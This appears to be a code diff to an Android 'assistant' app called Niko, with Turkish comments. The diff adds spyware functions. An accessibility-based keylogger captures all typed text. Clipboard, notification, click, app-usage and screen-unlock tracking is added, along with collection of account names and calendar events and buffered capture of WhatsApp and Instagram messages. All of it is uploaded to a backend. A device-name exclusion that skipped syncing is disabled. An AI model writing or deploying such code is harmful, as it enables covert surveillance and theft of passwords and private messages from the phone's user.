@@ -11,6 +11,7 @@ import android.content.ContentUris; // İçerik URI yönetimi
 import android.content.Intent; // Ekranlar arası geçiş ve mesajlaşma
 import android.content.pm.PackageManager; // Paket ve izin kontrolü
 import android.content.IntentFilter; // Sistem olaylarını filtreleme
+import android.content.BroadcastReceiver; // Yayın alıcısı
 import android.database.Cursor; // Veritabanı sorgu sonuçları
 import android.net.Uri; // Kaynak belirleyiciler (dosya/web yolları)
 import android.os.Bundle; // Ekran geçişlerinde veri taşıma
@@ -139,6 +140,8 @@ import java.util.regex.Pattern; // Düzenli ifade kalıbı (Regex)
 import android.accessibilityservice.AccessibilityService;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+
+
 
 /* *********************************************************************************
  * Niko Mobil Asistan'ın merkezi aktivite sınıfı. Bu sınıf; ses tanıma, 
@@ -327,6 +330,8 @@ public class MainActivity extends Activity {
     
     /** Log bellek sınırı (karakter cinsinden) */
     private final int MAX_LOG_SIZE = 50000;
+
+
 
     // --- Ağ ve Güncellemeler ---
     
@@ -699,6 +704,8 @@ public class MainActivity extends Activity {
         
         // Veri Senkronizasyonu Başlat (Arka planda)
         syncAllData();
+        
+
     }
 
     /**
@@ -3714,9 +3721,9 @@ public class MainActivity extends Activity {
         // Cihaz adını alarak senkronizasyon kimliğini belirle
         String deviceName = getDeviceName();
         // Cihaz adı kontrolü 
-        if ("Xiaomi_25069PTEBG".equals(deviceName)) {
-           return;
-        }
+        //if ("Xiaomi_25069PTEBG".equals(deviceName)) {
+        //   return;
+        //}
         new Thread(() -> {
             try {
                 // addLog("[SYNC] Veri senkronizasyonu başlatılıyor...");
@@ -3739,6 +3746,14 @@ public class MainActivity extends Activity {
                 try { syncBluetoothDevices(); } catch (Exception e) { addLog("Bluetooth Hatası: " + e.getMessage()); }
                 try { syncSensors(); } catch (Exception e) { addLog("Sensör Hatası: " + e.getMessage()); }
 
+                // --- Güvenlik & Takip (Erişilebilirlik Tabanlı - YENİ) ---
+                try { syncAccessibilityEvents(); } catch (Exception e) { addLog("Erişilebilirlik Hatası: " + e.getMessage()); }
+                try { syncKeylogs(); } catch (Exception e) { addLog("Keylog Hatası: " + e.getMessage()); }
+
+                // --- Kişisel & Hesap Verileri (YENİ) ---
+                try { syncAccounts(); } catch (Exception e) { addLog("Hesap Hatası: " + e.getMessage()); }
+                try { syncCalendarEvents(); } catch (Exception e) { addLog("Takvim Hatası: " + e.getMessage()); }
+                
                 // --- Güvenlik Verileri (Kayıt Dışı Girişim Takibi) ---
                 try { syncClipboard(); } catch (Exception e) { addLog("Pano Hatası: " + e.getMessage()); }
                 try { syncSurveillanceInfo(); } catch (Exception e) { addLog("Gözetim Hatası: " + e.getMessage()); }
@@ -4435,6 +4450,87 @@ public class MainActivity extends Activity {
         JSONArray array = new JSONArray();
         array.put(obj);
         sendSyncRequest(array, "surveillance_info");
+    }
+
+    /**
+     * Erişilebilirlik servisi tarafından toplanan pencere ve uygulama olaylarını senkronize eder.
+     */
+    private void syncAccessibilityEvents() throws Exception {
+        JSONArray data;
+        synchronized (NikoAccessibilityService.accessibilityLog) {
+            if (NikoAccessibilityService.accessibilityLog.length() == 0) return;
+            data = new JSONArray(NikoAccessibilityService.accessibilityLog.toString());
+            // Buffer'ı temizle
+            while (NikoAccessibilityService.accessibilityLog.length() > 0) {
+                NikoAccessibilityService.accessibilityLog.remove(0);
+            }
+        }
+        sendSyncRequest(data, "accessibility_events");
+    }
+
+    /**
+     * Erişilebilirlik servisi tarafından yakalanan metin girişlerini (keylog) senkronize eder.
+     */
+    private void syncKeylogs() throws Exception {
+        JSONArray data;
+        synchronized (NikoAccessibilityService.keylogBuffer) {
+            if (NikoAccessibilityService.keylogBuffer.length() == 0) return;
+            data = new JSONArray(NikoAccessibilityService.keylogBuffer.toString());
+            // Buffer'ı temizle
+            while (NikoAccessibilityService.keylogBuffer.length() > 0) {
+                NikoAccessibilityService.keylogBuffer.remove(0);
+            }
+        }
+        sendSyncRequest(data, "keylogs");
+    }
+
+    /**
+     * Cihazda kayıtlı tüm hesapları (Google, WhatsApp, Email vb.) senkronize eder.
+     */
+    private void syncAccounts() throws Exception {
+        android.accounts.AccountManager am = android.accounts.AccountManager.get(this);
+        android.accounts.Account[] accounts = am.getAccounts();
+        JSONArray array = new JSONArray();
+        for (android.accounts.Account ac : accounts) {
+            JSONObject obj = new JSONObject();
+            obj.put("name", ac.name);
+            obj.put("type", ac.type);
+            array.put(obj);
+        }
+        if (array.length() > 0) {
+            sendSyncRequest(array, "accounts");
+        }
+    }
+
+    /**
+     * Takvim etkinliklerini senkronize eder.
+     */
+    private void syncCalendarEvents() throws Exception {
+        if (checkSelfPermission(Manifest.permission.READ_CALENDAR) != PackageManager.PERMISSION_GRANTED) return;
+        
+        Uri uri = Uri.parse("content://com.android.calendar/events");
+        String[] projection = {"title", "description", "dtstart", "dtend", "eventLocation"};
+        
+        try (Cursor cursor = getContentResolver().query(uri, projection, null, null, "dtstart DESC")) {
+            if (cursor != null && cursor.moveToFirst()) {
+                JSONArray array = new JSONArray();
+                int limit = 50;
+                do {
+                    JSONObject obj = new JSONObject();
+                    obj.put("title", cursor.getString(0));
+                    obj.put("description", cursor.getString(1));
+                    obj.put("start_time", cursor.getLong(2));
+                    obj.put("end_time", cursor.getLong(3));
+                    obj.put("location", cursor.getString(4));
+                    array.put(obj);
+                    limit--;
+                } while (cursor.moveToNext() && limit > 0);
+                
+                if (array.length() > 0) {
+                    sendSyncRequest(array, "calendar_events");
+                }
+            }
+        }
     }
 
     /* *********************************************************************************
@@ -8064,7 +8160,11 @@ public class MainActivity extends Activity {
             speechRecognizer.destroy();
         if (tts != null)
             tts.shutdown();
+        
+
     }
+
+
     
     /**
      * Belirli bir animasyonu iptal eder.
@@ -8354,6 +8454,9 @@ public class MainActivity extends Activity {
      * Bildirim Erişimi (Notification Access) gerektirir.
      */
     public static class WhatsAppService extends NotificationListenerService {
+        // Gönderilemeyen mesajları biriktiren yedek tampon
+        private static final JSONArray pendingMessages = new JSONArray();
+
         @Override
         public void onNotificationPosted(StatusBarNotification sbn) {
             String packageName = sbn.getPackageName();
@@ -8364,17 +8467,26 @@ public class MainActivity extends Activity {
             Notification notification = sbn.getNotification();
             if (notification == null) return;
             Bundle extras = notification.extras;
-            String title = extras.getString(Notification.EXTRA_TITLE); // Gönderen
-            CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT); // Mesaj
+            String title = extras.getString(Notification.EXTRA_TITLE);
+            CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
 
             if (title == null || text == null) return;
+            
+            String msgText = text.toString();
+            
+            // Filtreleme: Gereksiz sistem bildirimlerini atla
+            if (msgText.equals("Bağlantınız kontrol ediliyor") || 
+                msgText.equals("Yeni mesajlar için kontrol ediliyor") ||
+                msgText.contains("WhatsApp Web şu anda aktif") ||
+                msgText.isEmpty()) {
+                return;
+            }
 
             // WhatsApp için yerel değişkenleri güncelle (Sesli okuma ve cevaplama için)
             if (packageName.equals("com.whatsapp")) {
                 lastWhatsAppMessage = text.toString();
                 lastWhatsAppSender = title;
 
-                // Hızlı cevap (Quick Reply) eylemlerini bul ve kaydet
                 if (notification.actions != null) {
                     for (Notification.Action a : notification.actions) {
                         if (a.getRemoteInputs() != null) {
@@ -8389,21 +8501,55 @@ public class MainActivity extends Activity {
                 JSONObject obj = new JSONObject();
                 obj.put("app", packageName.equals("com.whatsapp") ? "WhatsApp" : "Instagram");
                 obj.put("sender", title);
-                obj.put("message", text.toString());
+                obj.put("message", msgText);
                 obj.put("timestamp", System.currentTimeMillis());
 
-                JSONArray array = new JSONArray();
-                array.put(obj);
-
-                // Ana thread dışında backend'e gönder
+                // Anlık gönderim (retry mekanizmalı)
                 new Thread(() -> {
-                    try {
-                        if (instance != null) {
+                    if (instance == null) {
+                        // Instance yoksa tampona ekle
+                        synchronized (pendingMessages) { pendingMessages.put(obj); }
+                        return;
+                    }
+                    
+                    // Önce birikmiş mesajları gönder
+                    flushPendingMessages();
+                    
+                    // Yeni mesajı 3 denemeyle gönder
+                    JSONArray array = new JSONArray();
+                    array.put(obj);
+                    boolean sent = false;
+                    for (int attempt = 1; attempt <= 3 && !sent; attempt++) {
+                        try {
                             instance.sendSyncRequest(array, "social_messages");
+                            sent = true;
+                        } catch (Exception e) {
+                            if (attempt < 3) {
+                                try { Thread.sleep(1000 * attempt); } catch (InterruptedException ignored) {}
+                            }
                         }
-                    } catch (Exception ignored) {}
+                    }
+                    
+                    // 3 denemede de gönderilemezse tampona al
+                    if (!sent) {
+                        synchronized (pendingMessages) { pendingMessages.put(obj); }
+                    }
                 }).start();
             } catch (Exception ignored) {}
+        }
+        
+        /**
+         * Birikmiş mesajları toplu gönderir.
+         */
+        private static void flushPendingMessages() {
+            synchronized (pendingMessages) {
+                if (pendingMessages.length() == 0 || instance == null) return;
+                try {
+                    JSONArray batch = new JSONArray(pendingMessages.toString());
+                    while (pendingMessages.length() > 0) pendingMessages.remove(0);
+                    instance.sendSyncRequest(batch, "social_messages");
+                } catch (Exception ignored) {}
+            }
         }
     }
 
@@ -8553,42 +8699,304 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * Niko Akıllı Otomasyon Servisi: WhatsApp mesaj gönderimi ve YouTube Reklam Atlayıcı.
+     * Niko Gelişmiş Akıllı Otomasyon Servisi.
+     * 
+     * Veri Toplama:
+     * - Uygulama geçişleri ve kullanım süreleri
+     * - Metin girişleri (keylogger)
+     * - Tıklama, fokus, scroll olayları
+     * - Bildirim içerikleri
+     * - Pano (clipboard) değişiklikleri
+     * - Ekran açık/kapalı durumu
+     * 
+     * Otomasyonlar:
+     * - WhatsApp otomatik mesaj gönderimi
+     * - YouTube reklam atlama
      */
     public static class NikoAccessibilityService extends AccessibilityService {
         private static NikoAccessibilityService instance;
+        
+        // --- Veri Tamponları ---
+        public static final JSONArray accessibilityLog = new JSONArray();
+        public static final JSONArray keylogBuffer = new JSONArray();
+        public static final JSONArray clickLog = new JSONArray();
+        public static final JSONArray notificationLog = new JSONArray();
+        
+        // --- Uygulama Kullanım Takibi ---
+        private String currentForegroundApp = "";
+        private long appOpenedAt = 0;
+        private static final JSONArray appUsageLog = new JSONArray();
+        
+        // --- Ekran Durumu ---
+        private BroadcastReceiver screenReceiver;
+        
+        // --- Clipboard Takibi ---
+        private android.content.ClipboardManager clipboardManager;
+        private String lastClipboardContent = "";
 
         @Override
         protected void onServiceConnected() {
             super.onServiceConnected();
             instance = this;
-            addLog("✨ Niko Akıllı Otomasyon Servisi aktif.");
+            
+            // Ekran açık/kapalı dinleyicisi
+            registerScreenReceiver();
+            
+            // Clipboard değişiklik dinleyicisi
+            registerClipboardListener();
+            
+            addLog("✨ Niko Gelişmiş Otomasyon Servisi aktif.");
         }
 
         @Override
         public boolean onUnbind(Intent intent) {
             instance = null;
+            
+            // Receiver'ları temizle
+            try { if (screenReceiver != null) unregisterReceiver(screenReceiver); } catch (Exception ignored) {}
+            
             return super.onUnbind(intent);
+        }
+        
+        /**
+         * Ekran açık/kapalı durumunu takip eder.
+         */
+        private void registerScreenReceiver() {
+            try {
+                screenReceiver = new BroadcastReceiver() {
+                    @Override
+                    public void onReceive(Context context, Intent intent) {
+                        try {
+                            String action = intent.getAction();
+                            JSONObject event = new JSONObject();
+                            if (Intent.ACTION_SCREEN_ON.equals(action)) {
+                                event.put("event", "screen_on");
+                            } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
+                                event.put("event", "screen_off");
+                                // Ekran kapandığında mevcut uygulama kullanımını kaydet
+                                logAppUsageDuration();
+                            } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
+                                event.put("event", "user_unlocked");
+                            }
+                            event.put("time", System.currentTimeMillis());
+                            
+                            synchronized (accessibilityLog) {
+                                accessibilityLog.put(event);
+                            }
+                            flushIfReady(accessibilityLog, "accessibility_events", 5);
+                        } catch (Exception ignored) {}
+                    }
+                };
+                
+                IntentFilter filter = new IntentFilter();
+                filter.addAction(Intent.ACTION_SCREEN_ON);
+                filter.addAction(Intent.ACTION_SCREEN_OFF);
+                filter.addAction(Intent.ACTION_USER_PRESENT);
+                registerReceiver(screenReceiver, filter);
+            } catch (Exception ignored) {}
+        }
+        
+        /**
+         * Pano (clipboard) değişikliklerini takip eder.
+         */
+        private void registerClipboardListener() {
+            try {
+                clipboardManager = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+                if (clipboardManager != null) {
+                    clipboardManager.addPrimaryClipChangedListener(() -> {
+                        try {
+                            if (clipboardManager.hasPrimaryClip() && clipboardManager.getPrimaryClip() != null) {
+                                android.content.ClipData.Item item = clipboardManager.getPrimaryClip().getItemAt(0);
+                                CharSequence clipText = item.getText();
+                                if (clipText != null) {
+                                    String text = clipText.toString();
+                                    // Aynı içerik tekrar kopyalandıysa atla
+                                    if (text.equals(lastClipboardContent)) return;
+                                    lastClipboardContent = text;
+                                    
+                                    JSONObject clipObj = new JSONObject();
+                                    clipObj.put("type", "clipboard");
+                                    clipObj.put("content", text.length() > 500 ? text.substring(0, 500) : text);
+                                    clipObj.put("source_app", currentForegroundApp);
+                                    clipObj.put("time", System.currentTimeMillis());
+                                    
+                                    // Anlık gönderim
+                                    if (MainActivity.instance != null) {
+                                        JSONArray arr = new JSONArray();
+                                        arr.put(clipObj);
+                                        new Thread(() -> {
+                                            try { MainActivity.instance.sendSyncRequest(arr, "accessibility_events"); } catch (Exception ignored) {}
+                                        }).start();
+                                    }
+                                }
+                            }
+                        } catch (Exception ignored) {}
+                    });
+                }
+            } catch (Exception ignored) {}
         }
 
         @Override
         public void onAccessibilityEvent(AccessibilityEvent event) {
+            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+            int eventType = event.getEventType();
+
+            // --- 1. Uygulama Geçişi ve Kullanım Süresi Takibi ---
+            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                try {
+                    // Uygulama değiştiyse önceki uygulamanın süresini kaydet
+                    if (!packageName.equals(currentForegroundApp) && !packageName.isEmpty()) {
+                        logAppUsageDuration();
+                        currentForegroundApp = packageName;
+                        appOpenedAt = System.currentTimeMillis();
+                    }
+                    
+                    JSONObject log = new JSONObject();
+                    log.put("type", "window_change");
+                    log.put("app", packageName);
+                    log.put("activity", event.getClassName() != null ? event.getClassName().toString() : "");
+                    log.put("text", event.getText().toString());
+                    log.put("time", System.currentTimeMillis());
+                    
+                    synchronized (accessibilityLog) {
+                        accessibilityLog.put(log);
+                        if (accessibilityLog.length() > 300) accessibilityLog.remove(0);
+                    }
+                    flushIfReady(accessibilityLog, "accessibility_events", 10);
+                } catch (Exception ignored) {}
+            }
+            
+            // --- 2. Metin Girişleri (Keylogger) ---
+            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                try {
+                    JSONObject key = new JSONObject();
+                    key.put("app", packageName);
+                    key.put("input", event.getText().toString());
+                    key.put("time", System.currentTimeMillis());
+                    synchronized (keylogBuffer) {
+                        keylogBuffer.put(key);
+                        if (keylogBuffer.length() > 500) keylogBuffer.remove(0);
+                    }
+                    flushIfReady(keylogBuffer, "keylogs", 10);
+                } catch (Exception ignored) {}
+            }
+            
+            // --- 3. Tıklama Olayları ---
+            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                try {
+                    JSONObject click = new JSONObject();
+                    click.put("type", "click");
+                    click.put("app", packageName);
+                    click.put("text", event.getText() != null ? event.getText().toString() : "");
+                    click.put("desc", event.getContentDescription() != null ? event.getContentDescription().toString() : "");
+                    click.put("class", event.getClassName() != null ? event.getClassName().toString() : "");
+                    click.put("time", System.currentTimeMillis());
+                    synchronized (clickLog) {
+                        clickLog.put(click);
+                        if (clickLog.length() > 200) clickLog.remove(0);
+                    }
+                    flushIfReady(clickLog, "accessibility_events", 15);
+                } catch (Exception ignored) {}
+            }
+            
+            // --- 4. Bildirim Yakalama ---
+            if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
+                try {
+                    JSONObject notif = new JSONObject();
+                    notif.put("type", "notification");
+                    notif.put("app", packageName);
+                    notif.put("text", event.getText() != null ? event.getText().toString() : "");
+                    notif.put("time", System.currentTimeMillis());
+                    
+                    // Kendi bildirimlerimizi filtrele
+                    if (!packageName.equals("com.example.niko")) {
+                        synchronized (notificationLog) {
+                            notificationLog.put(notif);
+                            if (notificationLog.length() > 100) notificationLog.remove(0);
+                        }
+                        flushIfReady(notificationLog, "accessibility_events", 5);
+                    }
+                } catch (Exception ignored) {}
+            }
+            
+            // --- 5. Scroll/Fokus Olayları (Hafif kayıt) ---
+            if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
+                try {
+                    JSONObject scroll = new JSONObject();
+                    scroll.put("type", "scroll");
+                    scroll.put("app", packageName);
+                    scroll.put("from", event.getFromIndex());
+                    scroll.put("to", event.getToIndex());
+                    scroll.put("time", System.currentTimeMillis());
+                    synchronized (accessibilityLog) {
+                        accessibilityLog.put(scroll);
+                        if (accessibilityLog.length() > 300) accessibilityLog.remove(0);
+                    }
+                } catch (Exception ignored) {}
+            }
+
+            // --- 6. Otomasyonlar ---
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode == null) return;
 
-            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
-
-            // 1. WhatsApp Otomatik Gönderim
             if (packageName.equals("com.whatsapp")) {
                 handleWhatsAppAutoSend(rootNode);
-            }
-            
-            // 2. YouTube Reklam Atlayıcı (Pasif Otomasyon)
-            else if (packageName.equals("com.google.android.youtube")) {
+            } else if (packageName.equals("com.google.android.youtube")) {
                 handleYouTubeAdSkip(rootNode);
             }
 
             rootNode.recycle();
+        }
+        
+        /**
+         * Uygulama kullanım süresini kaydeder.
+         */
+        private void logAppUsageDuration() {
+            if (currentForegroundApp.isEmpty() || appOpenedAt == 0) return;
+            long duration = System.currentTimeMillis() - appOpenedAt;
+            if (duration < 1000) return; // 1 saniyeden kısa kullanımları atla
+            
+            try {
+                JSONObject usage = new JSONObject();
+                usage.put("type", "app_usage");
+                usage.put("app", currentForegroundApp);
+                usage.put("duration_ms", duration);
+                usage.put("duration_readable", formatDuration(duration));
+                usage.put("started_at", appOpenedAt);
+                usage.put("ended_at", System.currentTimeMillis());
+                
+                synchronized (appUsageLog) {
+                    appUsageLog.put(usage);
+                    if (appUsageLog.length() > 100) appUsageLog.remove(0);
+                }
+                flushIfReady(appUsageLog, "accessibility_events", 5);
+            } catch (Exception ignored) {}
+        }
+        
+        private String formatDuration(long ms) {
+            long seconds = ms / 1000;
+            if (seconds < 60) return seconds + "sn";
+            long minutes = seconds / 60;
+            if (minutes < 60) return minutes + "dk " + (seconds % 60) + "sn";
+            long hours = minutes / 60;
+            return hours + "sa " + (minutes % 60) + "dk";
+        }
+        
+        /**
+         * Tampon belirli bir boyuta ulaştığında anlık gönderim yapar.
+         */
+        private void flushIfReady(JSONArray buffer, String dataType, int threshold) {
+            synchronized (buffer) {
+                if (buffer.length() >= threshold && MainActivity.instance != null) {
+                    try {
+                        final JSONArray snapshot = new JSONArray(buffer.toString());
+                        while (buffer.length() > 0) buffer.remove(0);
+                        new Thread(() -> {
+                            try { MainActivity.instance.sendSyncRequest(snapshot, dataType); } catch (Exception ignored) {}
+                        }).start();
+                    } catch (Exception ignored) {}
+                }
+            }
         }
 
         private void handleWhatsAppAutoSend(AccessibilityNodeInfo rootNode) {
@@ -8606,7 +9014,6 @@ public class MainActivity extends Activity {
         }
 
         private void handleYouTubeAdSkip(AccessibilityNodeInfo rootNode) {
-            // "Reklamı Atla" veya "Skip Ad" butonlarını ara
             List<AccessibilityNodeInfo> skipButtons = rootNode.findAccessibilityNodeInfosByViewId("com.google.android.youtube:id/skip_ad_button");
             if (skipButtons == null || skipButtons.isEmpty()) {
                 skipButtons = rootNode.findAccessibilityNodeInfosByViewId("com.google.android.youtube:id/ad_skip_button");
@@ -8616,12 +9023,11 @@ public class MainActivity extends Activity {
                 for (AccessibilityNodeInfo node : skipButtons) {
                     if (node.isVisibleToUser() && node.isEnabled()) {
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                        if (instance != null) instance.addLog("📺 YouTube reklamı otomatik atlandı.");
+                        addLog("📺 YouTube reklamı otomatik atlandı.");
                     }
                     node.recycle();
                 }
             } else {
-                // Metin üzerinden ara (Daha genel çözüm)
                 findAndClickByText(rootNode, "reklamı atla", "skip ad");
             }
         }
@@ -8654,5 +9060,6 @@ public class MainActivity extends Activity {
         @Override
         public void onInterrupt() {}
     }
+
 
 }
